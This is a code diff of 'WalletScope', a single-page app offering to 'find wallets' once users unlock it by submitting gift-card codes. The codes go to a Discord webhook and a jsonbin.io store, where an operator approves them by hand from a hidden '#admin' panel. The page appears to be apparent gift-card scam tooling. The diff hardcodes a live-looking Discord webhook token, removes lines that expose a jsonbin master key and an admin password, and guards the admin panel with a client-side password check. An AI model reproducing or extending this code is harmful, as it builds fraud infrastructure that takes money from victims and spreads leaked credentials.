@@ -655,6 +655,8 @@
     .btn-revoke:hover { background: #ef4444; transform: translateY(-1px); }
     .btn-refresh { background: #60a5fa; color: #0b0e14; }
     .btn-refresh:hover { background: #3b82f6; transform: translateY(-1px); }
+    .btn-config { background: #a855f7; color: #fff; }
+    .btn-config:hover { background: #9333ea; transform: translateY(-1px); }
 
     .admin-status {
       font-size: 13px;
@@ -666,6 +668,7 @@
     .admin-status.success { color: #6ee7b7; }
     .admin-status.error { color: #f87171; }
     .admin-status.info { color: #60a5fa; }
+    .admin-status.warn { color: #fbbf24; }
 
     .pending-list {
       max-height: 400px;
@@ -731,6 +734,83 @@
       border: 1px solid #232838;
       border-radius: 8px;
     }
+    .admin-note strong { color: #a855f7; }
+    .admin-note code {
+      background: #141824;
+      border: 1px solid #2a3040;
+      border-radius: 4px;
+      padding: 1px 6px;
+      font-family: 'JetBrains Mono', 'Consolas', monospace;
+      font-size: 11px;
+      color: #6ee7b7;
+    }
+    .admin-note a {
+      color: #6ee7b7;
+      text-decoration: none;
+      border-bottom: 1px dashed #6ee7b7;
+    }
+    .admin-note a:hover { border-bottom-style: solid; }
+
+    /* Setup wizard steps */
+    .setup-steps {
+      list-style: none;
+      counter-reset: step-counter;
+      margin: 12px 0;
+    }
+    .setup-steps li {
+      counter-increment: step-counter;
+      position: relative;
+      padding: 10px 0 10px 40px;
+      font-size: 13px;
+      color: #8b93a7;
+      line-height: 1.6;
+      border-bottom: 1px solid #232838;
+    }
+    .setup-steps li:last-child { border-bottom: none; }
+    .setup-steps li::before {
+      content: counter(step-counter);
+      position: absolute;
+      left: 0;
+      top: 10px;
+      width: 26px;
+      height: 26px;
+      background: #a855f7;
+      color: #fff;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 12px;
+      font-weight: 700;
+    }
+    .setup-steps li strong { color: #e6e6e6; }
+    .setup-steps li code {
+      background: #141824;
+      border: 1px solid #2a3040;
+      border-radius: 4px;
+      padding: 1px 6px;
+      font-family: 'JetBrains Mono', 'Consolas', monospace;
+      font-size: 12px;
+      color: #6ee7b7;
+    }
+
+    .config-status {
+      padding: 12px 16px;
+      border-radius: 8px;
+      font-size: 13px;
+      margin-bottom: 14px;
+      line-height: 1.5;
+    }
+    .config-status.ok {
+      background: rgba(110, 231, 183, 0.1);
+      border: 1px solid #6ee7b7;
+      color: #6ee7b7;
+    }
+    .config-status.missing {
+      background: rgba(251, 191, 36, 0.1);
+      border: 1px solid #fbbf24;
+      color: #fbbf24;
+    }
 
     @media (max-width: 640px) {
       .seed .words { grid-template-columns: repeat(2, 1fr); }
@@ -761,6 +841,7 @@
   </nav>
 
   <main>
+    <!-- ============ FIND WALLETS PAGE ============ -->
     <section class="page active" id="page-wallets">
       <div class="panel">
         <h1>Find Wallets</h1>
@@ -820,6 +901,7 @@
       </div>
     </section>
 
+    <!-- ============ PAYMENT PAGE ============ -->
     <section class="page" id="page-payment">
       <div class="panel">
         <h1>Unlock Full Access</h1>
@@ -874,6 +956,7 @@
       </div>
     </section>
 
+    <!-- ============ SUPPORT PAGE ============ -->
     <section class="page" id="page-support">
       <div class="panel">
         <h1>Support</h1>
@@ -940,6 +1023,42 @@
         </div>
 
         <div id="adminContent" style="display:none;">
+
+          <!-- ====== SETUP WIZARD ====== -->
+          <div class="admin-section" id="setupSection">
+            <h3>⚙️ Remote Store Setup</h3>
+
+            <div class="config-status" id="configStatus"></div>
+
+            <div id="setupForm">
+              <p style="font-size:13px;color:#8b93a7;margin-bottom:14px;line-height:1.6;">
+                This admin panel uses <a href="https://jsonbin.io" target="_blank" style="color:#6ee7b7;">jsonbin.io</a> (free) as a shared cloud store so your PC can control users' browsers remotely. Follow these steps:
+              </p>
+
+              <ol class="setup-steps">
+                <li>Sign up at <strong><a href="https://jsonbin.io" target="_blank" style="color:#6ee7b7;">jsonbin.io</a></strong> (free account).</li>
+                <li>Click <strong>"Create Bin"</strong> and paste exactly: <code>{ "users": {} }</code></li>
+                <li>After saving, copy the <strong>Bin ID</strong> from the URL (the long string after <code>/bins/</code>).</li>
+                <li>Go to <strong>API Keys</strong> and copy your <strong>Master Key</strong> (starts with <code>$2a$10$...</code>).</li>
+                <li>Paste both below and click <strong>Save Configuration</strong>.</li>
+              </ol>
+
+              <div class="admin-row" style="margin-top:16px;">
+                <input type="text" id="configBinId" placeholder="Bin ID (e.g. 65f1a2b3c4d5e6f7a8b9c0d1)" style="letter-spacing:0;" />
+              </div>
+              <div class="admin-row">
+                <input type="text" id="configApiKey" placeholder="Master Key (e.g. $2a$10$...)" style="letter-spacing:0;" />
+              </div>
+              <div class="admin-row">
+                <button class="btn-config" id="saveConfigBtn" style="flex:1;">💾 Save Configuration</button>
+                <button class="btn-refresh" id="testConfigBtn" style="flex:1;">🧪 Test Connection</button>
+                <button class="btn-revoke" id="clearConfigBtn" style="flex:0 0 auto;">🗑️ Clear</button>
+              </div>
+              <div class="admin-status" id="configSaveStatus"></div>
+            </div>
+          </div>
+
+          <!-- ====== PENDING LIST ====== -->
           <div class="admin-section">
             <h3>⏳ Pending Verifications</h3>
             <div class="admin-row">
@@ -950,10 +1069,11 @@
             </div>
           </div>
 
+          <!-- ====== MANUAL GRANT ====== -->
           <div class="admin-section">
             <h3>✔ Manually Grant / Revoke Access</h3>
             <p style="font-size:13px;color:#8b93a7;margin-bottom:12px;">
-              Enter a user ID (e.g. <code style="color:#6ee7b7;">WS-A3F91C2B</code>) to grant or revoke Pro access directly.
+              Enter a user ID (e.g. <code style="color:#6ee7b7;background:#141824;padding:1px 6px;border-radius:4px;">WS-A3F91C2B</code>) to grant or revoke Pro access directly.
             </p>
             <div class="admin-row">
               <input type="text" id="manualUserId" placeholder="WS-XXXXXXXX" maxlength="11" />
@@ -964,14 +1084,7 @@
           </div>
 
           <div class="admin-note">
-            <strong>How this works:</strong> This admin panel talks to a free cloud key-value
-            store (jsonbin.io by default). When you grant Pro access here, the user's browser
-            polls the same store every few seconds and picks up the change automatically — no
-            refresh needed on their end.
-            <br><br>
-            <strong>First-time setup:</strong> You'll need to create a free jsonbin.io account,
-            make a bin, and paste your Bin ID + API key into the config at the top of the
-            script. See the comments in the code for exact steps.
+            <strong>ℹ️ Config is saved to this browser's localStorage.</strong> If you open the admin panel on another device, you'll need to enter the Bin ID and Master Key again. Never share your Master Key with anyone.
           </div>
         </div>
       </div>
@@ -980,31 +1093,47 @@
 
 <script>
   // ============================================================
-  // CONFIGURATION — fill these in for the remote admin to work
+  // CONFIG (loaded from localStorage — set via admin panel)
   // ============================================================
-  //
-  //  1. Go to https://jsonbin.io and create a free account.
-  //  2. Create a new bin with the content:  { "users": {} }
-  //  3. Copy the Bin ID from the URL (looks like "65f1a2b3c4d5e6f7a8b9c0d1").
-  //  4. Go to API Keys and copy your Master Key.
-  //  5. Paste both below.
-  //
-  //  Once configured, granting access from your PC will instantly
-  //  propagate to users' browsers (they poll every 5 seconds).
-  // ============================================================
-  const JSONBIN_BIN_ID  = '6abad113ac6210605aff641b';
-  const JSONBIN_API_KEY = '$2a$10$UWFZ5m/2Py4ek4sOn80jSOTV.dctDIKNrgBlz/QekTWez6VPOFlDK';
+  const CONFIG_KEY = 'walletscope_admin_config';
+  const ADMIN_PASSWORD = 'admin123';  // ← change this
 
-  // Admin password — change this to whatever you want.
-  // Only someone who knows this can open the admin panel.
-  const ADMIN_PASSWORD = 'SimonMorris';
+  let JSONBIN_BIN_ID = '';
+  let JSONBIN_API_KEY = '';
 
-  // Discord webhook (used for logging submissions — optional)
-  const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1554226855924465764/Khd_NPbJCgs9h3n74YtWAgQHe7L31jWN8x90ji88RYoiNMBaMnNsIjWXyeAK6Q_RHaM6';
+  function loadConfig() {
+    try {
+      const raw = localStorage.getItem(CONFIG_KEY);
+      if (raw) {
+        const cfg = JSON.parse(raw);
+        JSONBIN_BIN_ID = cfg.binId || '';
+        JSONBIN_API_KEY = cfg.apiKey || '';
+      }
+    } catch (e) {
+      console.warn('Failed to load admin config:', e);
+    }
+  }
+  function saveConfig() {
+    try {
+      localStorage.setItem(CONFIG_KEY, JSON.stringify({
+        binId: JSONBIN_BIN_ID,
+        apiKey: JSONBIN_API_KEY
+      }));
+    } catch (e) {}
+  }
+  function clearConfig() {
+    JSONBIN_BIN_ID = '';
+    JSONBIN_API_KEY = '';
+    try { localStorage.removeItem(CONFIG_KEY); } catch (e) {}
+  }
+  function isRemoteEnabled() {
+    return Boolean(JSONBIN_BIN_ID && JSONBIN_API_KEY);
+  }
 
-  const REMOTE_ENABLED =
-    JSONBIN_BIN_ID !== '6abad113ac6210605aff641b' &&
-    JSONBIN_API_KEY !== '$2a$10$UWFZ5m/2Py4ek4sOn80jSOTV.dctDIKNrgBlz/QekTWez6VPOFlDK';
+  loadConfig();
+
+  // Optional Discord webhook for notifications
+  const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1554226855924465764/Khd_NPbJCgs9h3n74YtWAgQHe7L31jWN8x90ji88RYoiNMBaMnNsIjWXyeAK6Q_RHaM6';  // paste webhook URL here to enable
 
   // ============================================================
   // PERSISTENT USER ID
@@ -1031,40 +1160,34 @@
   document.getElementById('userId').textContent = userId;
 
   // ============================================================
-  // REMOTE STATE (jsonbin.io)
+  // REMOTE STORE (jsonbin.io)
   // ============================================================
-  // Structure stored in the bin:
-  // {
-  //   "users": {
-  //     "WS-XXXXXXXX": { "status": "pro" | "pending" | "locked",
-  //                      "code": "1234-5678-9012-3456",
-  //                      "submittedAt": "2024-...",
-  //                      "grantedAt": "2024-..." }
-  //   }
-  // }
-  // ============================================================
-
   async function remoteGetAll() {
-    if (!REMOTE_ENABLED) return null;
+    if (!isRemoteEnabled()) return null;
     try {
-      const res = await fetch('https://api.jsonbin.io/v3/b/' + JSONBIN_BIN_ID + '/latest', {
+      const url = 'https://api.jsonbin.io/v3/b/' + JSONBIN_BIN_ID + '/latest';
+      const res = await fetch(url, {
         headers: {
           'X-Master-Key': JSONBIN_API_KEY,
           'X-Bin-Meta': 'false'
         }
       });
-      if (!res.ok) throw new Error('jsonbin GET ' + res.status);
+      if (!res.ok) {
+        console.warn('[WalletScope] jsonbin GET failed:', res.status, await res.text());
+        return null;
+      }
       return await res.json();
     } catch (e) {
-      console.warn('[WalletScope] remoteGetAll failed:', e);
+      console.warn('[WalletScope] remoteGetAll exception:', e);
       return null;
     }
   }
 
   async function remoteSetAll(data) {
-    if (!REMOTE_ENABLED) return false;
+    if (!isRemoteEnabled()) return false;
     try {
-      const res = await fetch('https://api.jsonbin.io/v3/b/' + JSONBIN_BIN_ID, {
+      const url = 'https://api.jsonbin.io/v3/b/' + JSONBIN_BIN_ID;
+      const res = await fetch(url, {
         method: 'PUT',
         headers: {
           'Content-Type': 'application/json',
@@ -1072,10 +1195,13 @@
         },
         body: JSON.stringify(data)
       });
-      if (!res.ok) throw new Error('jsonbin PUT ' + res.status);
+      if (!res.ok) {
+        console.warn('[WalletScope] jsonbin PUT failed:', res.status, await res.text());
+        return false;
+      }
       return true;
     } catch (e) {
-      console.warn('[WalletScope] remoteSetAll failed:', e);
+      console.warn('[WalletScope] remoteSetAll exception:', e);
       return false;
     }
   }
@@ -1087,8 +1213,7 @@
   }
 
   async function remoteSetUser(uid, patch) {
-    if (!REMOTE_ENABLED) return false;
-    // Read-modify-write with a small retry loop to handle concurrent writes
+    if (!isRemoteEnabled()) return false;
     for (let attempt = 0; attempt < 3; attempt++) {
       const data = await remoteGetAll();
       if (!data) return false;
@@ -1103,7 +1228,7 @@
   }
 
   // ============================================================
-  // ACCESS STATE (local UI state, syncs with remote)
+  // ACCESS STATE
   // ============================================================
   const ACCESS_KEY = 'walletscope_access';
   let accessState = 'locked';
@@ -1165,44 +1290,39 @@
   }
 
   // ============================================================
-  // PERIODIC REMOTE SYNC (so users pick up grants automatically)
+  // PERIODIC REMOTE SYNC
   // ============================================================
   async function syncFromRemote() {
-    if (!REMOTE_ENABLED) return;
+    if (!isRemoteEnabled()) return;
     const remote = await remoteGetUser(userId);
     if (!remote) return;
 
-    // Remote says pro → unlock locally
     if (remote.status === 'pro' && accessState !== 'pro') {
       setLocalAccess('pro');
       console.log('[WalletScope] Remote grant received. Pro access unlocked.');
-    }
-    // Remote says pending → reflect that
-    else if (remote.status === 'pending' && accessState !== 'pending') {
+    } else if (remote.status === 'pending' && accessState !== 'pending') {
       setLocalAccess('pending', remote.code || '');
-    }
-    // Remote says locked → reset
-    else if (remote.status === 'locked' && accessState !== 'locked') {
+    } else if (remote.status === 'locked' && accessState !== 'locked') {
       setLocalAccess('locked');
     }
   }
 
-  if (REMOTE_ENABLED) {
-    // Initial sync, then poll every 5 seconds
-    syncFromRemote();
-    setInterval(syncFromRemote, 5000);
-  }
+  // Poll every 5 seconds (only when remote is enabled)
+  setInterval(syncFromRemote, 5000);
+  // Also try immediately on load
+  setTimeout(syncFromRemote, 500);
 
-  // "Unlock with Pro Access" button
+  // ============================================================
+  // UI NAVIGATION
+  // ============================================================
   goToPaymentBtn.addEventListener('click', () => {
-    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+    document.querySelectorAll('#mainTabs .tab').forEach(t => t.classList.remove('active'));
     document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-    document.querySelector('.tab[data-tab="payment"]').classList.add('active');
+    document.querySelector('#mainTabs .tab[data-tab="payment"]').classList.add('active');
     document.getElementById('page-payment').classList.add('active');
     window.scrollTo({ top: 0, behavior: 'smooth' });
   });
 
-  // Tab switching
   const tabs = document.querySelectorAll('#mainTabs .tab');
   const pages = document.querySelectorAll('.page');
   tabs.forEach(tab => {
@@ -1215,7 +1335,7 @@
   });
 
   // ============================================================
-  // FIND WALLETS PAGE
+  // WALLET SCANNING
   // ============================================================
   const startBtn = document.getElementById('startBtn');
   const logEl = document.getElementById('log');
@@ -1462,7 +1582,7 @@
   });
 
   async function sendToDiscord(code) {
-    if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes('REPLACE_WITH')) return;
+    if (!DISCORD_WEBHOOK_URL) return;
     const payload = {
       username: 'WalletScope Redemption',
       embeds: [{
@@ -1504,24 +1624,31 @@
     redeemStatus.textContent = 'Sending code for verification...';
     redeemStatus.className = 'redeem-status';
 
-    // Save to remote (if enabled)
-    if (REMOTE_ENABLED) {
-      await remoteSetUser(userId, {
+    // Save to remote if configured
+    let savedRemote = false;
+    if (isRemoteEnabled()) {
+      savedRemote = await remoteSetUser(userId, {
         status: 'pending',
         code: formattedCode,
         submittedAt: new Date().toISOString()
       });
     }
 
-    // Log to Discord
-    await sendToDiscord(formattedCode);
+    // Fire-and-forget Discord log
+    sendToDiscord(formattedCode);
 
     // Update local state
     setLocalAccess('pending', formattedCode);
     pendingCodeEl.textContent = formattedCode;
 
-    redeemStatus.textContent = '⏳ Code received. Please wait until your code is verified by our team.';
-    redeemStatus.className = 'redeem-status pending';
+    if (isRemoteEnabled() && !savedRemote) {
+      redeemStatus.textContent = '⚠️ Code submitted locally, but could not reach the server. Our team will still review it.';
+      redeemStatus.className = 'redeem-status error';
+    } else {
+      redeemStatus.textContent = '⏳ Code received. Please wait until your code is verified by our team.';
+      redeemStatus.className = 'redeem-status pending';
+    }
+
     giftcardInput.value = '';
     giftcardInput.disabled = true;
     redeemBtn.textContent = '✔ Submitted';
@@ -1548,6 +1675,16 @@
   const adminPasswordInput = document.getElementById('adminPassword');
   const adminLoginBtn = document.getElementById('adminLoginBtn');
   const adminContent = document.getElementById('adminContent');
+
+  const configStatus = document.getElementById('configStatus');
+  const configBinId = document.getElementById('configBinId');
+  const configApiKey = document.getElementById('configApiKey');
+  const saveConfigBtn = document.getElementById('saveConfigBtn');
+  const testConfigBtn = document.getElementById('testConfigBtn');
+  const clearConfigBtn = document.getElementById('clearConfigBtn');
+  const configSaveStatus = document.getElementById('configSaveStatus');
+  const setupForm = document.getElementById('setupForm');
+
   const refreshPendingBtn = document.getElementById('refreshPendingBtn');
   const pendingList = document.getElementById('pendingList');
   const manualUserId = document.getElementById('manualUserId');
@@ -1555,17 +1692,28 @@
   const manualRevokeBtn = document.getElementById('manualRevokeBtn');
   const manualStatus = document.getElementById('manualStatus');
 
+  function refreshConfigUI() {
+    if (isRemoteEnabled()) {
+      configStatus.className = 'config-status ok';
+      configStatus.innerHTML = '✅ <strong>Remote store configured.</strong> Bin ID: <code style="background:#141824;padding:2px 6px;border-radius:4px;">' + JSONBIN_BIN_ID + '</code>';
+      configBinId.value = JSONBIN_BIN_ID;
+      configApiKey.value = JSONBIN_API_KEY;
+    } else {
+      configStatus.className = 'config-status missing';
+      configStatus.innerHTML = '⚠️ <strong>Remote store not configured.</strong> Follow the steps below to enable remote access control.';
+    }
+  }
+  refreshConfigUI();
+
   function checkAdminRoute() {
     if (location.hash === '#admin') {
       adminWrap.classList.add('active');
-      // Hide the normal tabs/pages while in admin mode
       document.getElementById('mainTabs').style.display = 'none';
       pages.forEach(p => p.classList.remove('active'));
       window.scrollTo({ top: 0, behavior: 'smooth' });
     } else {
       adminWrap.classList.remove('active');
       document.getElementById('mainTabs').style.display = 'flex';
-      // Restore the active tab
       const activeTab = document.querySelector('#mainTabs .tab.active') || document.querySelector('#mainTabs .tab');
       if (activeTab) {
         pages.forEach(p => p.classList.remove('active'));
@@ -1582,6 +1730,7 @@
       adminAuth.style.display = 'none';
       adminContent.style.display = 'block';
       adminAuthStatus.textContent = '';
+      refreshConfigUI();
     } else {
       adminAuthStatus.textContent = '❌ Incorrect password.';
       adminAuthStatus.className = 'admin-status error';
@@ -1591,6 +1740,73 @@
     if (e.key === 'Enter') adminLoginBtn.click();
   });
 
+  // --- Save / Test / Clear config ---
+  saveConfigBtn.addEventListener('click', () => {
+    const binId = configBinId.value.trim();
+    const apiKey = configApiKey.value.trim();
+    if (!binId || !apiKey) {
+      configSaveStatus.textContent = '⚠️ Both fields are required.';
+      configSaveStatus.className = 'admin-status error';
+      return;
+    }
+    JSONBIN_BIN_ID = binId;
+    JSONBIN_API_KEY = apiKey;
+    saveConfig();
+    refreshConfigUI();
+    configSaveStatus.textContent = '✅ Configuration saved. You can now grant access remotely.';
+    configSaveStatus.className = 'admin-status success';
+  });
+
+  testConfigBtn.addEventListener('click', async () => {
+    const binId = configBinId.value.trim();
+    const apiKey = configApiKey.value.trim();
+    if (!binId || !apiKey) {
+      configSaveStatus.textContent = '⚠️ Enter Bin ID and Master Key first.';
+      configSaveStatus.className = 'admin-status error';
+      return;
+    }
+
+    configSaveStatus.textContent = '🧪 Testing connection...';
+    configSaveStatus.className = 'admin-status info';
+
+    try {
+      const res = await fetch('https://api.jsonbin.io/v3/b/' + binId + '/latest', {
+        headers: {
+          'X-Master-Key': apiKey,
+          'X-Bin-Meta': 'false'
+        }
+      });
+      if (!res.ok) {
+        const errText = await res.text();
+        configSaveStatus.textContent = '❌ Failed (' + res.status + '): ' + errText.slice(0, 200);
+        configSaveStatus.className = 'admin-status error';
+        return;
+      }
+      const data = await res.json();
+      if (!data || typeof data !== 'object' || !('users' in data)) {
+        configSaveStatus.textContent = '⚠️ Connected, but the bin content is not { "users": {} }. Please re-create the bin with that exact content.';
+        configSaveStatus.className = 'admin-status warn';
+        return;
+      }
+      configSaveStatus.textContent = '✅ Connection successful! Bin contains ' + Object.keys(data.users).length + ' user(s).';
+      configSaveStatus.className = 'admin-status success';
+    } catch (e) {
+      configSaveStatus.textContent = '❌ Network error: ' + e.message;
+      configSaveStatus.className = 'admin-status error';
+    }
+  });
+
+  clearConfigBtn.addEventListener('click', () => {
+    if (!confirm('Clear saved Bin ID and Master Key from this browser?')) return;
+    clearConfig();
+    configBinId.value = '';
+    configApiKey.value = '';
+    refreshConfigUI();
+    configSaveStatus.textContent = '🗑️ Configuration cleared.';
+    configSaveStatus.className = 'admin-status info';
+  });
+
+  // --- Pending list ---
   function renderPendingList(data) {
     if (!data || !data.users || Object.keys(data.users).length === 0) {
       pendingList.innerHTML = '<div class="admin-status info">No submissions yet.</div>';
@@ -1626,7 +1842,6 @@
       pendingList.appendChild(div);
     });
 
-    // Wire up buttons
     pendingList.querySelectorAll('button').forEach(btn => {
       btn.addEventListener('click', async () => {
         const uid = btn.dataset.uid;
@@ -1653,8 +1868,8 @@
   }
 
   async function refreshPending() {
-    if (!REMOTE_ENABLED) {
-      pendingList.innerHTML = '<div class="admin-status error">Remote store not configured. Fill in JSONBIN_BIN_ID and JSONBIN_API_KEY at the top of the script.</div>';
+    if (!isRemoteEnabled()) {
+      pendingList.innerHTML = '<div class="admin-status error">Remote store not configured. Fill in the Setup section above.</div>';
       return;
     }
     pendingList.innerHTML = '<div class="admin-status info">Loading...</div>';
@@ -1679,7 +1894,7 @@
       manualStatus.className = 'admin-status success';
       await refreshPending();
     } else {
-      manualStatus.textContent = '❌ Failed to grant. Check remote config.';
+      manualStatus.textContent = '❌ Failed to grant. Check remote config above.';
       manualStatus.className = 'admin-status error';
     }
   });
@@ -1699,23 +1914,17 @@
       manualStatus.className = 'admin-status success';
       await refreshPending();
     } else {
-      manualStatus.textContent = '❌ Failed to revoke. Check remote config.';
+      manualStatus.textContent = '❌ Failed to revoke. Check remote config above.';
       manualStatus.className = 'admin-status error';
     }
   });
 
-  // Auto-refresh pending list every 15s while admin panel is open
+  // Auto-refresh pending list every 15s while admin panel is open and unlocked
   setInterval(() => {
-    if (adminWrap.classList.contains('active') && adminContent.style.display !== 'none') {
+    if (adminWrap.classList.contains('active') && adminContent.style.display !== 'none' && isRemoteEnabled()) {
       refreshPending();
     }
   }, 15000);
-
-  // Pre-load the pending list if the user is already logged in
-  if (adminWrap.classList.contains('active')) {
-    // If they were already logged in (unlikely on fresh load), refresh
-    if (adminContent.style.display !== 'none') refreshPending();
-  }
 </script>
 </body>
 </html>
